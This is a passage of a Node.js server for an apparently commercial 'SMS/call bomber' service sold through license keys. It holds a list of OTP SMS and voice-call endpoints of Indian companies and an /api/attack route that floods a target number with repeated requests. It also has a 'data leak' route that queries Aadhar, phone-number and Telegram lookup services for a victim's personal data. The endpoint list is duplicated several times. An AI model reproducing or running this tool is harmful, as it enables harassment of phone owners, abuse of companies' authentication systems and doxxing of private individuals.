      "url": "https://number-info-rootxindia.vercel.app/?key=muhmlo&number={phone}",
      "headers": {},
      "count": 1
    },
    {
      "id": 29,
      "name": "Aadhar Lookup",
      "type": "Data",
      "method": "GET",
      "url": "https://api-olive-five-53.vercel.app/aadhar?match={phone}",
      "headers": {},
      "count": 1
    },
    {
      "id": 30,
      "name": "Telegram to Number",
      "type": "Data",
      "method": "GET",
      "url": "https://tg-to-num-six.vercel.app/?key=rootxsuryansh&q={phone}",
      "headers": {},
      "count": 1
    },
        {
      "id": 4,
      "name": "SMS Bomb - Service 1",
      "type": "SMS",
      "method": "POST",
      "url": "https://example1.com/api/send",
      "headers": {
        "Content-Type": "application/json",
        "User-Agent": "Mozilla/5.0"
      },
      "body": {
        "phone": "{phone}",
        "message": "OTP: 123456"
      },
      "count": 2
    },
    {
      "id": 5,
      "name": "SMS Bomb - Service 2",
      "type": "SMS",
      "method": "POST",
      "url": "https://example2.com/api/otp",
      "headers": {
        "Content-Type": "application/x-www-form-urlencoded"
      },
      "body": "mobile={phone}&service=login",
      "count": 3
    },
    {
      "id": 6,
      "name": "Call Bomb - Service 1",
      "type": "Call",
      "method": "POST",
      "url": "https://callapi1.com/call",
      "headers": {},
      "body": {
        "phone": "{phone}"
      },
      "count": 1
    },
    // ============ SMS APIs (WORKING) ============
    {
      "id": 1,
      "name": "Paytm SMS",
      "type": "SMS",
      "method": "POST",
      "url": "https://accounts.paytm.com/signin/otp",
      "headers": { "Content-Type": "application/x-www-form-urlencoded" },
      "body": "phone={phone}&countryCode=+91",
      "count": 5
    },
    {
      "id": 2,
      "name": "Flipkart SMS",
      "type": "SMS",
      "method": "POST",
      "url": "https://www.flipkart.com/api/6/user/signup/status",
      "headers": { "Content-Type": "application/json" },
      "body": { "loginId": "+91{phone}" },
      "count": 5
    },
    {
      "id": 3,
      "name": "Amazon SMS",
      "type": "SMS",
      "method": "POST",
      "url": "https://www.amazon.in/ap/register",
      "headers": { "Content-Type": "application/x-www-form-urlencoded" },
      "body": "phoneNumber={phone}&countryCode=+91",
      "count": 5
    },
    {
      "id": 4,
      "name": "Swiggy SMS",
      "type": "SMS",
      "method": "POST",
      "url": "https://www.swiggy.com/api/auth/signup",
      "headers": { "Content-Type": "application/json" },
      "body": { "phone": "{phone}" },
      "count": 5
    },
    {
      "id": 5,
      "name": "Zomato SMS",
      "type": "SMS",
      "method": "POST",
      "url": "https://www.zomato.com/php/oauth_otp.php",
      "headers": { "Content-Type": "application/x-www-form-urlencoded" },
      "body": "phone={phone}&countryCode=+91",
      "count": 5
    },
    {
      "id": 6,
      "name": "Ola SMS",
      "type": "SMS",
      "method": "POST",
      "url": "https://api.olacabs.com/v1/authentication/otp",
      "headers": { "Content-Type": "application/json" },
      "body": { "phone": "+91{phone}" },
      "count": 5
    },
    {
      "id": 7,
      "name": "Uber SMS",
      "type": "SMS",
      "method": "POST",
      "url": "https://auth.uber.com/v2/oauth/otp",
      "headers": { "Content-Type": "application/json" },
      "body": { "phoneNumber": "+91{phone}" },
      "count": 5
    },
    {
      "id": 8,
      "name": "Airtel SMS",
      "type": "SMS",
      "method": "POST",
      "url": "https://www.airtel.in/thanks/api/otp",
      "headers": { "Content-Type": "application/x-www-form-urlencoded" },
      "body": "msisdn={phone}",
      "count": 5
    },
    {
      "id": 9,
      "name": "Jio SMS",
      "type": "SMS",
      "method": "POST",
      "url": "https://www.jio.com/api/otp/send",
      "headers": { "Content-Type": "application/json" },
      "body": { "mobile": "{phone}" },
      "count": 5
    },
    {
      "id": 10,
      "name": "Myntra SMS",
      "type": "SMS",
      "method": "POST",
      "url": "https://www.myntra.com/gw/authentication/v2/otp/generate",
      "headers": { "Content-Type": "application/json" },
      "body": { "mobile": "{phone}" },
      "count": 5
    },
    {
      "id": 11,
      "name": "BigBasket SMS",
      "type": "SMS",
      "method": "POST",
      "url": "https://www.bigbasket.com/auth/otp/login/",
      "headers": { "Content-Type": "application/x-www-form-urlencoded" },
      "body": "phone={phone}",
      "count": 5
    },
    {
      "id": 12,
      "name": "Netflix SMS",
      "type": "SMS",
      "method": "POST",
      "url": "https://www.netflix.com/in/login/help",
      "headers": { "Content-Type": "application/x-www-form-urlencoded" },
      "body": "phone={phone}",
      "count": 5
    },
    {
      "id": 13,
      "name": "Hotstar SMS",
      "type": "SMS",
      "method": "POST",
      "url": "https://api.hotstar.com/in/aadhar/v2/otp",
      "headers": { "Content-Type": "application/json" },
      "body": { "phone": "+91{phone}" },
      "count": 5
    },
    {
      "id": 14,
      "name": "Meesho SMS",
      "type": "SMS",
      "method": "POST",
      "url": "https://www.meesho.com/api/v2/otp/send",
      "headers": { "Content-Type": "application/json" },
      "body": { "phone": "{phone}" },
      "count": 5
    },
    {
      "id": 15,
      "name": "CRED SMS",
      "type": "SMS",
      "method": "POST",
      "url": "https://api.cred.club/api/v1/otp/send",
      "headers": { "Content-Type": "application/json" },
      "body": { "phone": "+91{phone}" },
      "count": 5
    },
    
    // ============ CALL APIs (WORKING) ============
    {
      "id": 16,
      "name": "PhonePe Voice Call",
      "type": "Call",
      "method": "POST",
      "url": "https://www.phonepe.com/api/v2/otp/voice",
      "headers": { "Content-Type": "application/json" },
      "body": { "phone": "+91{phone}", "type": "voice" },
      "count": 3
    },
    {
      "id": 17,
      "name": "Paytm Voice Call",
      "type": "Call",
      "method": "POST",
      "url": "https://accounts.paytm.com/voice/otp",
      "headers": { "Content-Type": "application/json" },
      "body": { "phone": "{phone}", "channel": "voice" },
      "count": 3
    },
    {
      "id": 18,
      "name": "Google Voice",
      "type": "Call",
      "method": "POST",
      "url": "https://www.google.com/voice/b/0/service/post",
      "headers": { "Content-Type": "application/x-www-form-urlencoded" },
      "body": "phoneNumber=%2B91{phone}&type=voice",
      "count": 3
    },
    {
      "id": 19,
      "name": "Amazon Voice Call",
      "type": "Call",
      "method": "POST",
      "url": "https://www.amazon.in/ap/voice-otp",
      "headers": { "Content-Type": "application/json" },
      "body": { "phoneNumber": "{phone}" },
      "count": 3
    },
    {
      "id": 20,
      "name": "Flipkart Voice",
      "type": "Call",
      "method": "POST",
      "url": "https://www.flipkart.com/api/6/user/voice-otp",
      "headers": { "Content-Type": "application/json" },
      "body": { "loginId": "+91{phone}" },
      "count": 3
    },
    {
      "id": 21,
      "name": "Swiggy Voice",
      "type": "Call",
      "method": "POST",
      "url": "https://www.swiggy.com/api/voice/otp",
      "headers": { "Content-Type": "application/json" },
      "body": { "phone": "{phone}" },
      "count": 3
    },
    {
      "id": 22,
      "name": "Zomato Voice",
      "type": "Call",
      "method": "POST",
      "url": "https://www.zomato.com/php/voice_otp.php",
      "headers": { "Content-Type": "application/x-www-form-urlencoded" },
      "body": "phone={phone}",
      "count": 3
    },
    {
      "id": 23,
      "name": "Ola Voice",
      "type": "Call",
      "method": "POST",
      "url": "https://api.olacabs.com/v1/voice/otp",
      "headers": { "Content-Type": "application/json" },
      "body": { "phone": "+91{phone}" },
      "count": 3
    },
    {
      "id": 24,
      "name": "Uber Voice",
      "type": "Call",
      "method": "POST",
      "url": "https://auth.uber.com/v2/voice-otp",
      "headers": { "Content-Type": "application/json" },
      "body": { "phone": "+91{phone}" },
      "count": 3
    },
    {
      "id": 25,
      "name": "Airtel Voice",
      "type": "Call",
      "method": "POST",
      "url": "https://www.airtel.in/voice/otp",
      "headers": { "Content-Type": "application/x-www-form-urlencoded" },
      "body": "msisdn={phone}",
      "count": 3
    },
    {
      "id": 26,
      "name": "Jio Voice",
      "type": "Call",
      "method": "POST",
      "url": "https://www.jio.com/api/voice/otp",
      "headers": { "Content-Type": "application/json" },
      "body": { "mobile": "{phone}" },
      "count": 3
    },
    {
      "id": 27,
      "name": "Myntra Voice",
      "type": "Call",
      "method": "POST",
      "url": "https://www.myntra.com/gw/voice/v2/otp",
      "headers": { "Content-Type": "application/json" },
      "body": { "mobile": "{phone}" },
      "count": 3
    },
    
    // ============ DATA APIS (BACKUP) ============
    {
      "id": 28,
      "name": "Number Info API",
      "type": "Data",
      "method": "GET",
      "url": "https://number-info-rootxindia.vercel.app/?key=muhmlo&number={phone}",
      "headers": {},
      "count": 1
    },
    {
      "id": 29,
      "name": "Aadhar Lookup",
      "type": "Data",
      "method": "GET",
      "url": "https://api-olive-five-53.vercel.app/aadhar?match={phone}",
      "headers": {},
      "count": 1
    },
    {
      "id": 30,
      "name": "Telegram to Number",
      "type": "Data",
      "method": "GET",
      "url": "https://tg-to-num-six.vercel.app/?key=rootxsuryansh&q={phone}",
      "headers": {},
      "count": 1
    },
        {
      "id": 4,
      "name": "SMS Bomb - Service 1",
      "type": "SMS",
      "method": "POST",
      "url": "https://example1.com/api/send",
      "headers": {
        "Content-Type": "application/json",
        "User-Agent": "Mozilla/5.0"
      },
      "body": {
        "phone": "{phone}",
        "message": "OTP: 123456"
      },
      "count": 2
    },
    {
      "id": 5,
      "name": "SMS Bomb - Service 2",
      "type": "SMS",
      "method": "POST",
      "url": "https://example2.com/api/otp",
      "headers": {
        "Content-Type": "application/x-www-form-urlencoded"
      },
      "body": "mobile={phone}&service=login",
      "count": 3
    },
    {
      "id": 6,
      "name": "Call Bomb - Service 1",
      "type": "Call",
      "method": "POST",
      "url": "https://callapi1.com/call",
      "headers": {},
      "body": {
        "phone": "{phone}"
      },
      "count": 1
    },
    // ============ SMS APIs (WORKING) ============
    {
      "id": 1,
      "name": "Paytm SMS",
      "type": "SMS",
      "method": "POST",
      "url": "https://accounts.paytm.com/signin/otp",
      "headers": { "Content-Type": "application/x-www-form-urlencoded" },
      "body": "phone={phone}&countryCode=+91",
      "count": 5
    },
    {
      "id": 2,
      "name": "Flipkart SMS",
      "type": "SMS",
      "method": "POST",
      "url": "https://www.flipkart.com/api/6/user/signup/status",
      "headers": { "Content-Type": "application/json" },
      "body": { "loginId": "+91{phone}" },
      "count": 5
    },
    {
      "id": 3,
      "name": "Amazon SMS",
      "type": "SMS",
      "method": "POST",
      "url": "https://www.amazon.in/ap/register",
      "headers": { "Content-Type": "application/x-www-form-urlencoded" },
      "body": "phoneNumber={phone}&countryCode=+91",
      "count": 5
    },
    {
      "id": 4,
      "name": "Swiggy SMS",
      "type": "SMS",
      "method": "POST",
      "url": "https://www.swiggy.com/api/auth/signup",
      "headers": { "Content-Type": "application/json" },
      "body": { "phone": "{phone}" },
      "count": 5
    },
    {
      "id": 5,
      "name": "Zomato SMS",
      "type": "SMS",
      "method": "POST",
      "url": "https://www.zomato.com/php/oauth_otp.php",
      "headers": { "Content-Type": "application/x-www-form-urlencoded" },
      "body": "phone={phone}&countryCode=+91",
      "count": 5
    },
    {
      "id": 6,
      "name": "Ola SMS",
      "type": "SMS",
      "method": "POST",
      "url": "https://api.olacabs.com/v1/authentication/otp",
      "headers": { "Content-Type": "application/json" },
      "body": { "phone": "+91{phone}" },
      "count": 5
    },
    {
      "id": 7,
      "name": "Uber SMS",
      "type": "SMS",
      "method": "POST",
      "url": "https://auth.uber.com/v2/oauth/otp",
      "headers": { "Content-Type": "application/json" },
      "body": { "phoneNumber": "+91{phone}" },
      "count": 5
    },
    {
      "id": 8,
      "name": "Airtel SMS",
      "type": "SMS",
      "method": "POST",
      "url": "https://www.airtel.in/thanks/api/otp",
      "headers": { "Content-Type": "application/x-www-form-urlencoded" },
      "body": "msisdn={phone}",
      "count": 5
    },
    {
      "id": 9,
      "name": "Jio SMS",
      "type": "SMS",
      "method": "POST",
      "url": "https://www.jio.com/api/otp/send",
      "headers": { "Content-Type": "application/json" },
      "body": { "mobile": "{phone}" },
      "count": 5
    },
    {
      "id": 10,
      "name": "Myntra SMS",
      "type": "SMS",
      "method": "POST",
      "url": "https://www.myntra.com/gw/authentication/v2/otp/generate",
      "headers": { "Content-Type": "application/json" },
      "body": { "mobile": "{phone}" },
      "count": 5
    },
    {
      "id": 11,
      "name": "BigBasket SMS",
      "type": "SMS",
      "method": "POST",
      "url": "https://www.bigbasket.com/auth/otp/login/",
      "headers": { "Content-Type": "application/x-www-form-urlencoded" },
      "body": "phone={phone}",
      "count": 5
    },
    {
      "id": 12,
      "name": "Netflix SMS",
      "type": "SMS",
      "method": "POST",
      "url": "https://www.netflix.com/in/login/help",
      "headers": { "Content-Type": "application/x-www-form-urlencoded" },
      "body": "phone={phone}",
      "count": 5
    },
    {
      "id": 13,
      "name": "Hotstar SMS",
      "type": "SMS",
      "method": "POST",
      "url": "https://api.hotstar.com/in/aadhar/v2/otp",
      "headers": { "Content-Type": "application/json" },
      "body": { "phone": "+91{phone}" },
      "count": 5
    },
    {
      "id": 14,
      "name": "Meesho SMS",
      "type": "SMS",
      "method": "POST",
      "url": "https://www.meesho.com/api/v2/otp/send",
      "headers": { "Content-Type": "application/json" },
      "body": { "phone": "{phone}" },
      "count": 5
    },
    {
      "id": 15,
      "name": "CRED SMS",
      "type": "SMS",
      "method": "POST",
      "url": "https://api.cred.club/api/v1/otp/send",
      "headers": { "Content-Type": "application/json" },
      "body": { "phone": "+91{phone}" },
      "count": 5
    },
    
    // ============ CALL APIs (WORKING) ============
    {
      "id": 16,
      "name": "PhonePe Voice Call",
      "type": "Call",
      "method": "POST",
      "url": "https://www.phonepe.com/api/v2/otp/voice",
      "headers": { "Content-Type": "application/json" },
      "body": { "phone": "+91{phone}", "type": "voice" },
      "count": 3
    },
    {
      "id": 17,
      "name": "Paytm Voice Call",
      "type": "Call",
      "method": "POST",
      "url": "https://accounts.paytm.com/voice/otp",
      "headers": { "Content-Type": "application/json" },
      "body": { "phone": "{phone}", "channel": "voice" },
      "count": 3
    },
    {
      "id": 18,
      "name": "Google Voice",
      "type": "Call",
      "method": "POST",
      "url": "https://www.google.com/voice/b/0/service/post",
      "headers": { "Content-Type": "application/x-www-form-urlencoded" },
      "body": "phoneNumber=%2B91{phone}&type=voice",
      "count": 3
    },
    {
      "id": 19,
      "name": "Amazon Voice Call",
      "type": "Call",
      "method": "POST",
      "url": "https://www.amazon.in/ap/voice-otp",
      "headers": { "Content-Type": "application/json" },
      "body": { "phoneNumber": "{phone}" },
      "count": 3
    },
    {
      "id": 20,
      "name": "Flipkart Voice",
      "type": "Call",
      "method": "POST",
      "url": "https://www.flipkart.com/api/6/user/voice-otp",
      "headers": { "Content-Type": "application/json" },
      "body": { "loginId": "+91{phone}" },
      "count": 3
    },
    {
      "id": 21,
      "name": "Swiggy Voice",
      "type": "Call",
      "method": "POST",
      "url": "https://www.swiggy.com/api/voice/otp",
      "headers": { "Content-Type": "application/json" },
      "body": { "phone": "{phone}" },
      "count": 3
    },
    {
      "id": 22,
      "name": "Zomato Voice",
      "type": "Call",
      "method": "POST",
      "url": "https://www.zomato.com/php/voice_otp.php",
      "headers": { "Content-Type": "application/x-www-form-urlencoded" },
      "body": "phone={phone}",
      "count": 3
    },
    {
      "id": 23,
      "name": "Ola Voice",
      "type": "Call",
      "method": "POST",
      "url": "https://api.olacabs.com/v1/voice/otp",
      "headers": { "Content-Type": "application/json" },
      "body": { "phone": "+91{phone}" },
      "count": 3
    },
    {
      "id": 24,
      "name": "Uber Voice",
      "type": "Call",
      "method": "POST",
      "url": "https://auth.uber.com/v2/voice-otp",
      "headers": { "Content-Type": "application/json" },
      "body": { "phone": "+91{phone}" },
      "count": 3
    },
    {
      "id": 25,
      "name": "Airtel Voice",
      "type": "Call",
      "method": "POST",
      "url": "https://www.airtel.in/voice/otp",
      "headers": { "Content-Type": "application/x-www-form-urlencoded" },
      "body": "msisdn={phone}",
      "count": 3
    },
    {
      "id": 26,
      "name": "Jio Voice",
      "type": "Call",
      "method": "POST",
      "url": "https://www.jio.com/api/voice/otp",
      "headers": { "Content-Type": "application/json" },
      "body": { "mobile": "{phone}" },
      "count": 3
    },
    {
      "id": 27,
      "name": "Myntra Voice",
      "type": "Call",
      "method": "POST",
      "url": "https://www.myntra.com/gw/voice/v2/otp",
      "headers": { "Content-Type": "application/json" },
      "body": { "mobile": "{phone}" },
      "count": 3
    },
    
    // ============ DATA APIS (BACKUP) ============
    {
      "id": 28,
      "name": "Number Info API",
      "type": "Data",
      "method": "GET",
      "url": "https://number-info-rootxindia.vercel.app/?key=muhmlo&number={phone}",
      "headers": {},
      "count": 1
    },
    {
      "id": 29,
      "name": "Aadhar Lookup",
      "type": "Data",
      "method": "GET",
      "url": "https://api-olive-five-53.vercel.app/aadhar?match={phone}",
      "headers": {},
      "count": 1
    },
    {
      "id": 30,
      "name": "Telegram to Number",
      "type": "Data",
      "method": "GET",
      "url": "https://tg-to-num-six.vercel.app/?key=rootxsuryansh&q={phone}",
      "headers": {},
      "count": 1
    },
    {
      "id": 7,
      "name": "Call Bomb - Service 2",
      "type": "Call",
      "method": "POST",
      "url": "https://callapi2.com/voice",
      "headers": {},
      "body": "number={phone}",
      "count": 1
    }
  ]
};

// Save apis to file
try {
  fs.writeFileSync('./apis.json', JSON.stringify(apisData, null, 2));
  console.log(`✅ Created apis.json with ${apisData.apis.length} APIs`);
} catch (error) {
  console.log('❌ Error saving apis.json:', error.message);
}

// Database
let database = {
  users: [],
  keys: [],
  attacks: [],
  locations: [],
  logs: []
};

try {
  if (fs.existsSync('./database.json')) {
    database = JSON.parse(fs.readFileSync('./database.json', 'utf8'));
  } else {
    fs.writeFileSync('./database.json', JSON.stringify(database, null, 2));
  }
  console.log(`✅ Loaded ${database.users.length} users, ${database.keys.length} keys`);
} catch (error) {
  console.log('❌ Error loading database');
}

// Save database
function saveDatabase() {
  fs.writeFileSync('./database.json', JSON.stringify(database, null, 2));
}

// Add log
function addLog(type, message, data = {}) {
  const log = {
    id: crypto.randomBytes(8).toString('hex'),
    type,
    message,
    data,
    timestamp: new Date().toISOString()
  };
  database.logs.push(log);
  if (database.logs.length > 1000) database.logs = database.logs.slice(-1000);
  saveDatabase();
  io.emit('new-log', log);
  return log;
}

// =============== KEY GENERATION FUNCTIONS ===============

// Generate unique key
function generateKey(plan = 'basic', duration = 30) {
  const prefix = plan === 'premium' ? 'PRM' : plan === 'vip' ? 'VIP' : 'BAS';
  const random = crypto.randomBytes(12).toString('hex').toUpperCase();
  const key = `${prefix}-${random.substring(0, 4)}-${random.substring(4, 8)}-${random.substring(8, 12)}-${random.substring(12, 16)}`;
  
  const keyData = {
    key: key,
    plan: plan,
    duration: duration,
    createdAt: new Date().toISOString(),
    expiresAt: new Date(Date.now() + duration * 24 * 60 * 60 * 1000).toISOString(),
    used: false,
    usedBy: null,
    usedAt: null
  };
  
  database.keys.push(keyData);
  saveDatabase();
  addLog('key', `Generated ${plan} key: ${key}`, { plan, duration });
  
  return keyData;
}

// Validate key
function validateKey(key) {
  const keyData = database.keys.find(k => k.key === key);
  
  if (!keyData) {
    return { valid: false, message: 'Invalid key' };
  }
  
  if (keyData.used) {
    return { valid: false, message: 'Key already used' };
  }
  
  if (new Date() > new Date(keyData.expiresAt)) {
    return { valid: false, message: 'Key expired' };
  }
  
  return { valid: true, keyData };
}

// Use key
function useKey(key, userId) {
  const keyData = database.keys.find(k => k.key === key);
  if (!keyData) return false;
  
  keyData.used = true;
  keyData.usedBy = userId;
  keyData.usedAt = new Date().toISOString();
  saveDatabase();
  
  return keyData;
}

// =============== API CALL FUNCTION ===============

async function callApi(api, phone) {
  try {
    let url = api.url;
    let data = null;
    
    // Replace {phone} in URL
    url = url.replace(/{phone}/g, phone);
    
    // Prepare data
    if (api.body) {
      if (typeof api.body === 'string') {
        data = api.body.replace(/{phone}/g, phone);
      } else {
        data = {};
        for (let key in api.body) {
          let value = api.body[key];
          if (typeof value === 'string') {
            value = value.replace(/{phone}/g, phone);
          } else if (typeof value === 'object') {
            value = JSON.parse(JSON.stringify(value).replace(/{phone}/g, phone));
          }
          data[key] = value;
        }
      }
    }

    const response = await axios({
      method: api.method,
      url: url,
      headers: api.headers || {},
      data: data,
      timeout: 5000,
      validateStatus: false
    });

    return { success: true, status: response.status };
  } catch (error) {
    return { success: false, error: error.message };
  }
}

// =============== DATA LEAK API FUNCTIONS ===============

async function fetchDataLeak(api, phone) {
  try {
    let url = api.url.replace(/{phone}/g, phone);
    
    const response = await axios({
      method: api.method || 'GET',
      url: url,
      headers: {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
        'Accept': 'application/json',
        ...api.headers
      },
      timeout: 10000,
      validateStatus: false
    });

    let data = response.data;
    
    // Try to parse if it's string
    if (typeof data === 'string') {
      try {
        data = JSON.parse(data);
      } catch (e) {
        // Keep as string
      }
    }

    return { 
      success: true, 
      status: response.status,
      data: data 
    };
  } catch (error) {
    return { 
      success: false, 
      error: error.message,
      data: null 
    };
  }
}

// =============== API ENDPOINTS ===============

// Validate key
app.post('/api/validate-key', (req, res) => {
  const { key, userId } = req.body;
  
  const validation = validateKey(key);
  
  if (validation.valid) {
    // Use the key
    useKey(key, userId);
    
    // Create or update user
    let user = database.users.find(u => u.id === userId);
    if (!user) {
      user = {
        id: userId,
        key: key,
        plan: validation.keyData.plan,
        activatedAt: new Date().toISOString(),
        expiresAt: validation.keyData.expiresAt,
        attacksDone: 0
      };
      database.users.push(user);
    } else {
      user.key = key;
      user.plan = validation.keyData.plan;
      user.activatedAt = new Date().toISOString();
      user.expiresAt = validation.keyData.expiresAt;
    }
    saveDatabase();
    
    res.json({ 
      success: true, 
      message: 'Key validated successfully',
      user: {
        plan: validation.keyData.plan,
        expiresAt: validation.keyData.expiresAt
      }
    });
  } else {
    res.json({ success: false, message: validation.message });
  }
});

// Check user status
app.post('/api/user-status', (req, res) => {
  const { userId } = req.body;
  
  const user = database.users.find(u => u.id === userId);
  
  if (!user) {
    return res.json({ 
      active: false,
      message: 'No active subscription'
    });
  }
  
  if (new Date() > new Date(user.expiresAt)) {
    return res.json({ 
      active: false,
      message: 'Subscription expired'
    });
  }
  
  res.json({
    active: true,
    plan: user.plan,
    expiresAt: user.expiresAt,
    attacksDone: user.attacksDone
  });
});

// Get all APIs
app.get('/api/apis', (req, res) => {
  res.json({
    total: apisData.apis.length,
    apis: apisData.apis
  });
});

// Public key generation (for testing)
app.post('/api/generate-test-key', (req, res) => {
  const { plan, duration } = req.body;
  
  const validPlans = ['basic', 'premium', 'vip'];
  if (!validPlans.includes(plan)) {
    return res.json({ success: false, message: 'Invalid plan' });
  }
  
  const key = generateKey(plan, duration || 30);
  
  res.json({
    success: true,
    key: key.key,
    plan: key.plan,
    expiresAt: key.expiresAt,
    message: 'Test key generated successfully'
  });
});

// Start attack
app.post('/api/attack', async (req, res) => {
  const { phone, duration, speed, userId } = req.body;
  
  // Verify user
  const user = database.users.find(u => u.id === userId);
  if (!user || new Date() > new Date(user.expiresAt)) {
    return res.json({ success: false, message: 'Invalid or expired subscription' });
  }
  
  console.log(`⚡ Attack started: ${phone} for ${duration}s by user ${userId}`);
  addLog('attack', `Attack started on +91${phone}`, { phone, duration, speed, userId });
  
  // Set headers for SSE
  res.writeHead(200, {
    'Content-Type': 'text/event-stream',
    'Cache-Control': 'no-cache',
    'Connection': 'keep-alive'
  });

  const startTime = Date.now();
  const endTime = startTime + (duration * 1000);
  
  let totalRequests = 0;
  let successRequests = 0;
  let failedRequests = 0;
  
  // Filter SMS and Call APIs only
  const smsApis = apisData.apis.filter(api => api.type === 'SMS' || api.type === 'Call' || api.type === 'WhatsApp');
  const batchSize = speed === 5 ? smsApis.length : Math.floor(smsApis.length * (speed / 5));
  
  const attackInterval = setInterval(async () => {
    const now = Date.now();
    
    if (now >= endTime) {
      clearInterval(attackInterval);
      
      user.attacksDone = (user.attacksDone || 0) + 1;
      saveDatabase();
      
      addLog('attack', `Attack completed on +91${phone}`, { totalRequests, successRequests, failedRequests });
      
      res.write(`data: ${JSON.stringify({ 
        type: 'end', 
        total: totalRequests, 
        success: successRequests, 
        failed: failedRequests 
      })}\n\n`);
      res.end();
      return;
    }

    const promises = [];
    
    for (let i = 0; i < batchSize; i++) {
      const api = smsApis[i % smsApis.length];
      for (let j = 0; j < (api.count || 1); j++) {
        promises.push(callApi(api, phone));
      }
    }

    const results = await Promise.allSettled(promises);
    
    results.forEach(result => {
      totalRequests++;
      if (result.status === 'fulfilled' && result.value.success) {
        successRequests++;
      } else {
        failedRequests++;
      }
    });

    const elapsed = Math.floor((Date.now() - startTime) / 1000);
    const progress = (elapsed / duration) * 100;
    const rps = totalRequests / elapsed || 0;

    res.write(`data: ${JSON.stringify({
      type: 'update',
      elapsed,
      total: totalRequests,
      success: successRequests,
      failed: failedRequests,
      progress,
      rps: rps.toFixed(1)
    })}\n\n`);

  }, 1000);
});

// Enhanced data leak search
app.post('/api/data-leak', async (req, res) => {
  const { phone, userId } = req.body;
  
  // Verify user
  const user = database.users.find(u => u.id === userId);
  if (!user || new Date() > new Date(user.expiresAt)) {
    return res.json({ success: false, message: 'Invalid or expired subscription' });
  }
  
  // Filter data leak APIs
  const dataApis = apisData.apis.filter(api => api.type === 'Data');
  
  const results = [];
  
  for (const api of dataApis) {
    try {
      console.log(`🔍 Searching ${api.name} for +91${phone}`);
      const result = await fetchDataLeak(api, phone);
      
      results.push({
        name: api.name,
        url: api.url,
        success: result.success,
        data: result.data,
        error: result.error
      });
      
      // Add small delay between API calls
      await new Promise(resolve => setTimeout(resolve, 500));
      
    } catch (error) {
      results.push({
        name: api.name,
        success: false,
        error: error.message
      });
    }
  }
  
  addLog('data', `Data leak search for +91${phone}`, { 
    phone,
    resultsCount: results.filter(r => r.success).length,
    totalResults: results.length
  });
  
  res.json({
    success: true,
    phone: phone,
    timestamp: new Date().toISOString(),
    results: results
  });
});

// =============== ADMIN ENDPOINTS ===============

// Admin login
app.post('/admin/api/login', (req, res) => {
  const { password } = req.body;
  
  if (password === ADMIN_PASSWORD) {
    const token = crypto.randomBytes(32).toString('hex');
    res.json({ success: true, token });
  } else {
    res.json({ success: false });
  }
});

// Generate key (admin only)
app.post('/admin/api/generate-key', (req, res) => {
  const { plan, duration, adminToken } = req.body;
  
  // Simple token check
  if (!adminToken) {
    return res.json({ success: false, message: 'Unauthorized' });
  }
  
  const key = generateKey(plan, duration);
  
  res.json({
    success: true,
    key: key.key,
    plan: key.plan,
    expiresAt: key.expiresAt
  });
});

// Get all keys (admin only)
app.post('/admin/api/keys', (req, res) => {
  const { adminToken } = req.body;
  
  if (!adminToken) {
    return res.json({ success: false, message: 'Unauthorized' });
  }
  
  res.json({
    success: true,
    keys: database.keys
  });
});

// Get stats (admin only)
app.post('/admin/api/stats', (req, res) => {
  const { adminToken } = req.body;
  
  if (!adminToken) {
    return res.json({ success: false, message: 'Unauthorized' });
  }
  
  const activeUsers = database.users.filter(u => new Date() <= new Date(u.expiresAt)).length;
  const totalAttacks = database.attacks.length;
  const totalKeys = database.keys.length;
  const usedKeys = database.keys.filter(k => k.used).length;
  
  res.json({
    success: true,
    stats: {
      totalUsers: database.users.length,
      activeUsers,
      totalAttacks,
      totalKeys,
      usedKeys,
      availableKeys: totalKeys - usedKeys,
      totalLocations: database.locations.length
    }
  });
});

// =============== SOCKET.IO ===============
io.on('connection', (socket) => {
  console.log('🔌 Client connected:', socket.id);
  
  socket.on('disconnect', () => {
    console.log('🔌 Client disconnected:', socket.id);
  });
});

// Serve main page
app.get('/', (req, res) => {
  res.sendFile(path.join(__dirname, 'public', 'index.html'));
});

// Serve admin panel
app.get('/admin', (req, res) => {
  res.sendFile(path.join(__dirname, 'admin', 'admin-panel.html'));
});

// Start server
server.listen(PORT, '0.0.0.0', () => {
  console.log(`
╔══════════════════════════════════════════════════════════════════╗
║              ⚡ SHAIQUA PRIMIUM ADVANCED EDITION ⚡                ║
╠══════════════════════════════════════════════════════════════════╣
║                                                                  ║
║  📡 Server URL: http://localhost:${PORT}                             ║
║  📊 Total APIs: ${apisData.apis.length}                                         ║
║  🔑 Key System: ✅ ACTIVE                                         ║
║  👥 Total Users: ${database.users.length}                                        ║
║                                                                  ║
╠══════════════════════════════════════════════════════════════════╣
║                                                                  ║
║  🔑 Admin Panel: http://localhost:${PORT}/admin                      ║
║  🔐 Admin Password: ${ADMIN_PASSWORD}                                   ║
║  📞 Support: @introvert_O2z                                       ║
║                                                                   ║
╚══════════════════════════════════════════════════════════════════╝
  `);
  
  // Generate some test keys on startup
  console.log('\n📋 Generating test keys...');
  generateKey('basic', 30);
  generateKey('premium', 30);
  generateKey('vip', 30);
  console.log('✅ Test keys generated!');
});